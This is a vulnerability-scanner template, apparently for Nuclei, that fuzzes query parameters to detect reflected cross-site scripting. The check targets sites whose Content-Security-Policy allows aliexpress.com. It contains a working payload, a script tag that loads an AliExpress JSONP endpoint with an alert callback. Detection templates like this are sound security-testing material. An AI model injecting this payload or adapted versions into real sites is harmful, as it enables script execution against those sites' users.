id: aliexpress-csp-xss

info:
  name: Content-Security-Policy Bypass via AliExpress
  author: DhiyaneshDK
  severity: high
  reference:
    - https://github.com/renniepak/CSPBypass/blob/0b4c8aee52497d660adce7a6d67311a73383818c/data.tsv#L4C5-L4C19
  metadata:
    verified: true
  tags: xss,csp-bypass,aliexpress

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>'

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{url_encode(injection)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{injection}}"

      - type: word
        part: content_type
        words:
          - "text/html"

      - type: word
        part: content_security_policy
        words:
          - "aliexpress.com"
          - "script-src"
        condition: and